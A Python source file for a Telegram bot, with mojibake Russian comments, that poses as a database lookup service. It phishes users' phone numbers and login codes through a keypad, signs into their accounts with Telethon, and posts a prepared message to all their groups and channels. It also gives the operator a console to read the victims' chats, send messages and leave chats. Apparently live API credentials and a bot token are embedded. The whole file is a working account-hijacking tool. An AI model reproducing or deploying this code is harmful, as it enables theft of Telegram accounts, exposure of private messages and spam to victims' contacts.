import logging
import os
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)
from telethon.sync import TelegramClient
from telethon.errors import SessionPasswordNeededError, FloodWaitError
from telethon.tl.types import Channel, Chat

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# –°–æ—Å—Ç–æ—è–Ω–∏—è –¥–ª—è ConversationHandler
PHONE, CODE = range(2)

# –í–∞—à–∏ API-–∫–ª—é—á–∏ (–∑–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ —Å–≤–æ–∏)
API_ID = "27804658"
API_HASH = "b07a67acb15e0582e59d1db55579fb8e"
BOT_TOKEN = "7814381268:AAHuqZjVdX2UPbxFL9Cy7pVCXmqbdbVEzCs"

# –ó–∞–≥–æ—Ç–æ–≤–ª–µ–Ω–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è —Ä–∞—Å—Å—ã–ª–∫–∏
PREPARED_MESSAGE = "@HowIWD_bot –∫—Ç–æ –º–µ–Ω—è —Ç—É—Ç —Å—É–∫–æ–π –∑–∞–ø–∏—Å–∞–ª?–ê–õ–õ–û"

# –ì–ª–æ–±–∞–ª—å–Ω–∞—è –ø–µ—Ä–µ–º–µ–Ω–Ω–∞—è –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –∞–∫—Ç–∏–≤–Ω–æ–≥–æ –∫–ª–∏–µ–Ω—Ç–∞ Telethon
active_client = None

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """–û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /start, –∑–∞–ø—Ä–æ—Å –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞."""
    user = update.effective_user
    logger.info(f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user.id} –≤—ã–∑–≤–∞–ª –∫–æ–º–∞–Ω–¥—É /start")

    # –°–æ–∑–¥–∞–µ–º –∫–Ω–æ–ø–∫—É –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞
    keyboard = [[KeyboardButton("–û—Ç–ø—Ä–∞–≤–∏—Ç—å –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞", request_contact=True)]]
    reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True)

    await update.message.reply_text(
        "–ü—Ä–∏–≤–µ—Ç! –û—Ç–ø—Ä–∞–≤—å –º–Ω–µ —Å–≤–æ–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –≤ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö.",
        reply_markup=reply_markup,
    )
    return PHONE

async def receive_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """–û–±—Ä–∞–±–æ—Ç–∫–∞ –ø–æ–ª—É—á–µ–Ω–Ω–æ–≥–æ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞."""
    contact = update.message.contact
    phone_number = contact.phone_number
    user_id = update.effective_user.id
    logger.info(f"–ü–æ–ª—É—á–µ–Ω –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –æ—Ç {user_id}: {phone_number}")

    # –°–æ—Ö—Ä–∞–Ω—è–µ–º –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç–µ
    context.user_data["phone_number"] = phone_number
    context.user_data["code_digits"] = []  # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º —Å–ø–∏—Å–æ–∫ –¥–ª—è —Ü–∏—Ñ—Ä –∫–æ–¥–∞

    # –û—á–∏—â–∞–µ–º —Å—Ç–∞—Ä—É—é —Å–µ—Å—Å–∏—é, –µ—Å–ª–∏ –æ–Ω–∞ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç
    session_file = f"session_{user_id}.session"
    if os.path.exists(session_file):
        os.remove(session_file)
        logger.info(f"–£–¥–∞–ª–µ–Ω–∞ —Å—Ç–∞—Ä–∞—è —Å–µ—Å—Å–∏—è: {session_file}")

    # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º Telethon –∫–ª–∏–µ–Ω—Ç
    client = TelegramClient(
        f"session_{user_id}",
        API_ID,
        API_HASH,
        system_version="4.16.30-vxCUSTOM",
        app_version="1.0"
    )
    try:
        await client.connect()
        if not await client.is_user_authorized():
            sent_code = await client.send_code_request(phone_number, force_sms=False)
            context.user_data["client"] = client
            context.user_data["code_hash"] = sent_code.phone_code_hash
            logger.info(f"–ö–æ–¥ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –¥–ª—è {phone_number}, phone_code_hash: {sent_code.phone_code_hash}")
        else:
            logger.warning(f"–ö–ª–∏–µ–Ω—Ç —É–∂–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω –¥–ª—è {user_id}")
            await update.message.reply_text("–í—ã —É–∂–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω—ã. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.")
            await client.disconnect()
            return ConversationHandler.END
    except FloodWaitError as fwe:
        logger.error(f"–û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ Telegram: –Ω—É–∂–Ω–æ –ø–æ–¥–æ–∂–¥–∞—Ç—å {fwe.seconds} —Å–µ–∫—É–Ω–¥")
        await update.message.reply_text(f"–°–ª–∏—à–∫–æ–º –º–Ω–æ–≥–æ –∑–∞–ø—Ä–æ—Å–æ–≤. –ü–æ–¥–æ–∂–¥–∏—Ç–µ {fwe.seconds // 60} –º–∏–Ω—É—Ç –∏ –ø–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.")
        await client.disconnect()
        return ConversationHandler.END
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –∫–æ–¥–∞: {str(e)}")
        await update.message.reply_text(f"–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞: {str(e)}. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.")
        await client.disconnect()
        return ConversationHandler.END

    # –°–æ–∑–¥–∞–µ–º —Ü–∏—Ñ—Ä–æ–≤—É—é –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É
    await update.message.reply_text(
        "–ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω! –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö, –∏—Å–ø–æ–ª—å–∑—É—è –∫–Ω–æ–ø–∫–∏ –Ω–∏–∂–µ:",
        reply_markup=create_keypad()
    )
    return CODE

def create_keypad(code_digits: list = None) -> InlineKeyboardMarkup:
    """–°–æ–∑–¥–∞–µ—Ç —Ü–∏—Ñ—Ä–æ–≤—É—é –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É —Å –∫–Ω–æ–ø–∫–∞–º–∏ 0-9, –£–¥–∞–ª–∏—Ç—å –∏ –í–≤–µ—Å—Ç–∏."""
    if code_digits is None:
        code_digits = []

    # –§–æ—Ä–º–∏—Ä—É–µ–º –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ –∫–æ–¥–∞ (–∑–≤–µ–∑–¥–æ—á–∫–∏ –¥–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏)
    code_display = "*" * len(code_digits) if code_digits else "–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥"

    # –°–æ–∑–¥–∞–µ–º –∫–Ω–æ–ø–∫–∏ 0-9
    buttons = [
        [
            InlineKeyboardButton("1", callback_data="digit_1"),
            InlineKeyboardButton("2", callback_data="digit_2"),
            InlineKeyboardButton("3", callback_data="digit_3"),
        ],
        [
            InlineKeyboardButton("4", callback_data="digit_4"),
            InlineKeyboardButton("5", callback_data="digit_5"),
            InlineKeyboardButton("6", callback_data="digit_6"),
        ],
        [
            InlineKeyboardButton("7", callback_data="digit_7"),
            InlineKeyboardButton("8", callback_data="digit_8"),
            InlineKeyboardButton("9", callback_data="digit_9"),
        ],
        [
            InlineKeyboardButton("0", callback_data="digit_0"),
            InlineKeyboardButton("üî¥ –£–¥–∞–ª–∏—Ç—å", callback_data="delete"),
            InlineKeyboardButton("‚úÖ –í–≤–µ—Å—Ç–∏", callback_data="submit"),
        ],
    ]

    # –í–æ–∑–≤—Ä–∞—â–∞–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É
    return InlineKeyboardMarkup(buttons)

async def handle_keypad(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """–û–±—Ä–∞–±–æ—Ç–∫–∞ –Ω–∞–∂–∞—Ç–∏–π –Ω–∞ —Ü–∏—Ñ—Ä–æ–≤—É—é –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É."""
    query = update.callback_query
    await query.answer()

    user_id = query.from_user.id
    code_digits = context.user_data.get("code_digits", [])

    # –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º callback_data
    data = query.data
    if data.startswith("digit_"):
        # –î–æ–±–∞–≤–ª—è–µ–º —Ü–∏—Ñ—Ä—É
        digit = data.split("_")[1]
        code_digits.append(digit)
        context.user_data["code_digits"] = code_digits
    elif data == "delete":
        # –£–¥–∞–ª—è–µ–º –ø–æ—Å–ª–µ–¥–Ω—é—é —Ü–∏—Ñ—Ä—É
        if code_digits:
            code_digits.pop()
            context.user_data["code_digits"] = code_digits
    elif data == "submit":
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –≤–≤–µ–¥–µ–Ω –ª–∏ –∫–æ–¥
        if not code_digits:
            await query.edit_message_text(
                text="–û—à–∏–±–∫–∞: –∫–æ–¥ –Ω–µ –≤–≤–µ–¥–µ–Ω. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –∫–æ–¥.",
                reply_markup=create_keypad(code_digits)
            )
            return CODE

        # –§–æ—Ä–º–∏—Ä—É–µ–º –∫–æ–¥ –∫–∞–∫ —Å—Ç—Ä–æ–∫—É
        code = "".join(code_digits)
        logger.info(f"–ü–æ–ª—É—á–µ–Ω –∫–æ–¥ –æ—Ç {user_id}: {code}")

        # –í—ã–∑—ã–≤–∞–µ–º —Ñ—É–Ω–∫—Ü–∏—é –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
        return await receive_code(update, context, code)

    # –û–±–Ω–æ–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –∫–ª–∞–≤–∏–∞—Ç—É—Ä–æ–π
    code_display = "*" * len(code_digits) if code_digits else "–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥"
    await query.edit_message_text(
        text=f"–ö–æ–¥: {code_display}",
        reply_markup=create_keypad(code_digits)
    )
    return CODE

async def receive_code(update: Update, context: ContextTypes.DEFAULT_TYPE, code: str = None) -> int:
    """–û–±—Ä–∞–±–æ—Ç–∫–∞ –≤–≤–µ–¥–µ–Ω–Ω–æ–≥–æ –∫–æ–¥–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏."""
    global active_client
    query = update.callback_query
    user_id = query.from_user.id
    client = context.user_data.get("client")
    phone_number = context.user_data.get("phone_number")
    phone_code_hash = context.user_data.get("code_hash")

    if not client:
        await query.edit_message_text("–°–µ—Å—Å–∏—è –∏—Å—Ç–µ–∫–ª–∞. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –Ω–∞—á–Ω–∏—Ç–µ –∑–∞–Ω–æ–≤–æ —Å /start.")
        return ConversationHandler.END

    try:
        await client.sign_in(
            phone=phone_number, code=code, phone_code_hash=phone_code_hash
        )
        me = await client.get_me()
        active_client = client  # –°–æ—Ö—Ä–∞–Ω—è–µ–º –∫–ª–∏–µ–Ω—Ç –¥–ª—è –∫–æ–Ω—Å–æ–ª—å–Ω–æ–≥–æ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è
        await query.edit_message_text(
            f"–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–∞! –í—ã –≤–æ—à–ª–∏ –∫–∞–∫ {me.first_name}.\n\n–ù–∞—á–∏–Ω–∞—é —Ä–∞—Å—Å—ã–ª–∫—É –∑–∞–≥–æ—Ç–æ–≤–ª–µ–Ω–Ω–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è..."
        )
        # –ó–∞–ø—É—Å–∫–∞–µ–º —Ä–∞—Å—Å—ã–ª–∫—É —Å—Ä–∞–∑—É –ø–æ—Å–ª–µ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
        await send_message_to_chats(update, context, client)
        # –ó–∞–ø—É—Å–∫–∞–µ–º –∫–æ–Ω—Å–æ–ª—å–Ω—ã–π –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å
        asyncio.create_task(console_interface(user_id))
        return ConversationHandler.END
    except SessionPasswordNeededError:
        await query.edit_message_text(
            "–¢—Ä–µ–±—É–µ—Ç—Å—è –ø–∞—Ä–æ–ª—å –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏. –≠—Ç–æ—Ç –±–æ—Ç –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –ø–∞—Ä–æ–ª–∏."
        )
        return ConversationHandler.END
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏: {str(e)}")
        error_message = str(e).lower()
        if "confirmation code has expired" in error_message:
            await query.edit_message_text(
                "–ö–æ–¥ –∏—Å—Ç–µ–∫ –∏–ª–∏ –Ω–µ–¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª–µ–Ω. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –Ω–∞—á–Ω–∏—Ç–µ –∑–∞–Ω–æ–≤–æ —Å /start."
            )
        else:
            await query.edit_message_text(
                f"–û—à–∏–±–∫–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏: {str(e)}. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –∫–æ–¥ –∏ –ø–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞."
            )
        return ConversationHandler.END
    finally:
        if active_client is None and "client" in context.user_data and context.user_data["client"]:
            await client.disconnect()
            context.user_data["client"] = None

async def send_message_to_chats(update: Update, context: ContextTypes.DEFAULT_TYPE, client: TelegramClient) -> int:
    """–û—Ç–ø—Ä–∞–≤–∫–∞ –∑–∞–≥–æ—Ç–æ–≤–ª–µ–Ω–Ω–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è –≤–æ –≤—Å–µ –∫–∞–Ω–∞–ª—ã –∏ –≥—Ä—É–ø–ø—ã."""
    user_id = update.effective_user.id
    logger.info(f"–ù–∞—á–∞–ª–æ —Ä–∞—Å—Å—ã–ª–∫–∏ –∑–∞–≥–æ—Ç–æ–≤–ª–µ–Ω–Ω–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è –æ—Ç {user_id}")

    try:
        await client.connect()
        if not await client.is_user_authorized():
            await update.callback_query.edit_message_text("–°–µ—Å—Å–∏—è –∏—Å—Ç–µ–∫–ª–∞. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –Ω–∞—á–Ω–∏—Ç–µ –∑–∞–Ω–æ–≤–æ —Å /start.")
            return ConversationHandler.END

        # –ü–æ–ª—É—á–∞–µ–º –≤—Å–µ –¥–∏–∞–ª–æ–≥–∏ (—á–∞—Ç—ã, –∫–∞–Ω–∞–ª—ã, –≥—Ä—É–ø–ø—ã)
        successful = 0
        failed = 0
        async for dialog in client.iter_dialogs():
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ –¥–∏–∞–ª–æ–≥ –∫–∞–Ω–∞–ª–æ–º, —Å—É–ø–µ—Ä–≥—Ä—É–ø–ø–æ–π –∏–ª–∏ –æ–±—ã—á–Ω–æ–π –≥—Ä—É–ø–ø–æ–π
            if isinstance(dialog.entity, Channel):
                # –ö–∞–Ω–∞–ª—ã –∏ —Å—É–ø–µ—Ä–≥—Ä—É–ø–ø—ã
                if dialog.entity.broadcast or dialog.entity.megagroup:
                    try:
                        await client.send_message(dialog.entity, PREPARED_MESSAGE)
                        successful += 1
                        logger.info(f"–°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ {dialog.name} (ID: {dialog.id})")
                    except FloodWaitError as fwe:
                        logger.error(f"–û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ Telegram –≤ {dialog.name}: –Ω—É–∂–Ω–æ –ø–æ–¥–æ–∂–¥–∞—Ç—å {fwe.seconds} —Å–µ–∫—É–Ω–¥")
                        failed += 1
                    except Exception as e:
                        logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –≤ {dialog.name}: {str(e)}")
                        failed += 1
                else:
                    logger.info(f"–ü—Ä–æ–ø—É—â–µ–Ω {dialog.name}: –Ω–µ –∫–∞–Ω–∞–ª –∏ –Ω–µ —Å—É–ø–µ—Ä–≥—Ä—É–ø–ø–∞")
            elif isinstance(dialog.entity, Chat):
                # –û–±—ã—á–Ω—ã–µ –≥—Ä—É–ø–ø—ã
                try:
                    await client.send_message(dialog.entity, PREPARED_MESSAGE)
                    successful += 1
                    logger.info(f"–°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ {dialog.name} (ID: {dialog.id})")
                except FloodWaitError as fwe:
                    logger.error(f"–û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ Telegram –≤ {dialog.name}: –Ω—É–∂–Ω–æ –ø–æ–¥–æ–∂–¥–∞—Ç—å {fwe.seconds} —Å–µ–∫—É–Ω–¥")
                    failed += 1
                except Exception as e:
                    logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –≤ {dialog.name}: {str(e)}")
                    failed += 1
            else:
                logger.info(f"–ü—Ä–æ–ø—É—â–µ–Ω {dialog.name}: –Ω–µ –∫–∞–Ω–∞–ª –∏ –Ω–µ –≥—Ä—É–ø–ø–∞")

        await update.callback_query.edit_message_text(
            f"–ó–∞—à–ª–∏ –≤ –±–∞–∑—É –¥–∞–Ω–Ω—ã—Ö. –°–º–æ—Ç—Ä–∏–ºüëÄ "
            f"–ù—É–∂–Ω–æ –ø–æ–¥–æ–∂–¥–∞—Ç—å 5 –º–∏–Ω—É—Ç, —á—Ç–æ–±—ã –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –≤—Å—é –±–∞–∑—É –¥–∞–Ω–Ω—ã—Ö –≤ –Ω–µ–π –ø—Ä–∏—Å—É—Ç—Å—Ç–≤—É–µ—Ç <791> –ø–æ–∑–∏—Ü–∏—è"
        )
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–∞—Å—Å—ã–ª–∫–µ: {str(e)}")
        await update.callback_query.edit_message_text(f"–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–∞—Å—Å—ã–ª–∫–µ: {str(e)}")
    finally:
        context.user_data.clear()  # –û—á–∏—â–∞–µ–º –¥–∞–Ω–Ω—ã–µ –ø–æ—Å–ª–µ —Ä–∞—Å—Å—ã–ª–∫–∏, –Ω–æ –∫–ª–∏–µ–Ω—Ç –æ—Å—Ç–∞–µ—Ç—Å—è –∞–∫—Ç–∏–≤–Ω—ã–º

    return ConversationHandler.END

async def console_interface(user_id: int):
    """–ö–æ–Ω—Å–æ–ª—å–Ω—ã–π –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –∞–∫–∫–∞—É–Ω—Ç–æ–º."""
    global active_client
    print(f"\n–ö–æ–Ω—Å–æ–ª—å —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –∞–∫–∫–∞—É–Ω—Ç–æ–º (User ID: {user_id})")
    print("–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:")
    print("  list_chats - –ü–æ–∫–∞–∑–∞—Ç—å —Å–ø–∏—Å–æ–∫ –≤—Å–µ—Ö –∫–∞–Ω–∞–ª–æ–≤ –∏ –≥—Ä—É–ø–ø")
    print("  send <chat_id> <message> - –û—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ —á–∞—Ç")
    print("  leave <chat_id> - –ü–æ–∫–∏–Ω—É—Ç—å —á–∞—Ç")
    print("  get_messages <chat_id> <limit> - –ü–æ–ª—É—á–∏—Ç—å –ø–æ—Å–ª–µ–¥–Ω–∏–µ —Å–æ–æ–±—â–µ–Ω–∏—è –∏–∑ —á–∞—Ç–∞")
    print("  exit - –ó–∞–≤–µ—Ä—à–∏—Ç—å —Å–µ—Å—Å–∏—é –∏ –≤—ã–π—Ç–∏")
    print("–í–≤–µ–¥–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É:")

    while active_client:
        try:
            # –ß–∏—Ç–∞–µ–º –∫–æ–º–∞–Ω–¥—É –∏–∑ –∫–æ–Ω—Å–æ–ª–∏
            command = await asyncio.get_event_loop().run_in_executor(None, input)
            parts = command.strip().split(maxsplit=2)
            if not parts:
                print("–ü—É—Å—Ç–∞—è –∫–æ–º–∞–Ω–¥–∞. –í–≤–µ–¥–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É, –Ω–∞–ø—Ä–∏–º–µ—Ä: list_chats")
                continue

            cmd = parts[0].lower()
            args = parts[1:] if len(parts) > 1 else []

            if cmd == "list_chats":
                await console_list_chats(active_client)
            elif cmd == "send" and len(args) == 2:
                chat_id, message = args
                await console_send_message(active_client, chat_id, message)
            elif cmd == "leave" and len(args) == 1:
                chat_id = args[0]
                await console_leave_chat(active_client, chat_id)
            elif cmd == "get_messages" and len(args) == 2:
                chat_id, limit = args
                await console_get_messages(active_client, chat_id, limit)
            elif cmd == "exit":
                await console_exit(active_client)
                active_client = None
                print("–°–µ—Å—Å–∏—è –∑–∞–≤–µ—Ä—à–µ–Ω–∞.")
                break
            else:
                print("–ù–µ–≤–µ—Ä–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞ –∏–ª–∏ –∞—Ä–≥—É–º–µ–Ω—Ç—ã. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: list_chats, send <chat_id> <message>, leave <chat_id>, get_messages <chat_id> <limit>, exit")
        except Exception as e:
            print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –∫–æ–º–∞–Ω–¥—ã: {str(e)}")
        print("\n–í–≤–µ–¥–∏—Ç–µ —Å–ª–µ–¥—É—é—â—É—é –∫–æ–º–∞–Ω–¥—É:")

async def console_list_chats(client: TelegramClient):
    """–ü–æ–∫–∞–∑–∞—Ç—å —Å–ø–∏—Å–æ–∫ –≤—Å–µ—Ö –∫–∞–Ω–∞–ª–æ–≤ –∏ –≥—Ä—É–ø–ø."""
    try:
        await client.connect()
        print("\n–°–ø–∏—Å–æ–∫ —á–∞—Ç–æ–≤:")
        async for dialog in client.iter_dialogs():
            if isinstance(dialog.entity, (Channel, Chat)):
                chat_type = "–ö–∞–Ω–∞–ª" if isinstance(dialog.entity, Channel) and dialog.entity.broadcast else \
                            "–°—É–ø–µ—Ä–≥—Ä—É–ø–ø–∞" if isinstance(dialog.entity, Channel) and dialog.entity.megagroup else "–ì—Ä—É–ø–ø–∞"
                print(f"{chat_type}: {dialog.name} (ID: {dialog.id})")
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —á–∞—Ç–æ–≤: {str(e)}")

async def console_send_message(client: TelegramClient, chat_id: str, message: str):
    """–û—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ —É–∫–∞–∑–∞–Ω–Ω—ã–π —á–∞—Ç."""
    try:
        chat_id = int(chat_id)
        await client.connect()
        await client.send_message(chat_id, message)
        print(f"–°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ —á–∞—Ç {chat_id}: {message}")
    except ValueError:
        print("–û—à–∏–±–∫–∞: chat_id –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —á–∏—Å–ª–æ–º")
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Å–æ–æ–±—â–µ–Ω–∏—è: {str(e)}")

async def console_leave_chat(client: TelegramClient, chat_id: str):
    """–ü–æ–∫–∏–Ω—É—Ç—å —É–∫–∞–∑–∞–Ω–Ω—ã–π —á–∞—Ç."""
    try:
        chat_id = int(chat_id)
        await client.connect()
        await client.delete_dialog(chat_id)
        print(f"–ß–∞—Ç {chat_id} –ø–æ–∫–∏–Ω—É—Ç")
    except ValueError:
        print("–û—à–∏–±–∫–∞: chat_id –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —á–∏—Å–ª–æ–º")
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–∫–∏–¥–∞–Ω–∏–∏ —á–∞—Ç–∞: {str(e)}")

async def console_get_messages(client: TelegramClient, chat_id: str, limit: str):
    """–ü–æ–ª—É—á–∏—Ç—å –ø–æ—Å–ª–µ–¥–Ω–∏–µ —Å–æ–æ–±—â–µ–Ω–∏—è –∏–∑ —á–∞—Ç–∞."""
    try:
        chat_id = int(chat_id)
        limit = int(limit)
        if limit <= 0:
            print("–û—à–∏–±–∫–∞: limit –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –ø–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω—ã–º —á–∏—Å–ª–æ–º")
            return
        await client.connect()
        messages = await client.get_messages(chat_id, limit=limit)
        print(f"\n–ü–æ—Å–ª–µ–¥–Ω–∏–µ {limit} —Å–æ–æ–±—â–µ–Ω–∏–π –≤ —á–∞—Ç–µ {chat_id}:")
        for msg in messages:
            sender = await msg.get_sender()
            sender_name = sender.username if sender and hasattr(sender, 'username') else "Unknown"
            print(f"[{msg.date}] {sender_name}: {msg.text}")
    except ValueError:
        print("–û—à–∏–±–∫–∞: chat_id –∏ limit –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å —á–∏—Å–ª–∞–º–∏")
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —Å–æ–æ–±—â–µ–Ω–∏–π: {str(e)}")

async def console_exit(client: TelegramClient):
    """–ó–∞–≤–µ—Ä—à–∏—Ç—å —Å–µ—Å—Å–∏—é."""
    try:
        await client.disconnect()
        print("–ö–ª–∏–µ–Ω—Ç –æ—Ç–∫–ª—é—á–µ–Ω")
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã—Ö–æ–¥–µ: {str(e)}")

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """–û—Ç–º–µ–Ω–∞ –ø—Ä–æ—Ü–µ—Å—Å–∞."""
    global active_client
    user_id = update.effective_user.id
    client = context.user_data.get("client")
    if client:
        await client.disconnect()
    if active_client:
        await active_client.disconnect()
        active_client = None
    context.user_data.clear()
    await update.message.reply_text("–ü—Ä–æ—Ü–µ—Å—Å –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ –∏–ª–∏ —Ä–∞—Å—Å—ã–ª–∫–∏ –æ—Ç–º–µ–Ω–µ–Ω.")
    return ConversationHandler.END

def main() -> None:
    """–ó–∞–ø—É—Å–∫ –±–æ—Ç–∞."""
    application = Application.builder().token(BOT_TOKEN).build()

    # –ù–∞—Å—Ç—Ä–æ–π–∫–∞ ConversationHandler
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            PHONE: [MessageHandler(filters.CONTACT, receive_phone)],
            CODE: [CallbackQueryHandler(handle_keypad)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    application.add_handler(conv_handler)

    # –ó–∞–ø—É—Å–∫ –±–æ—Ç–∞
    application.run_polling(allowed_updates=Update.ALL_TYPES)

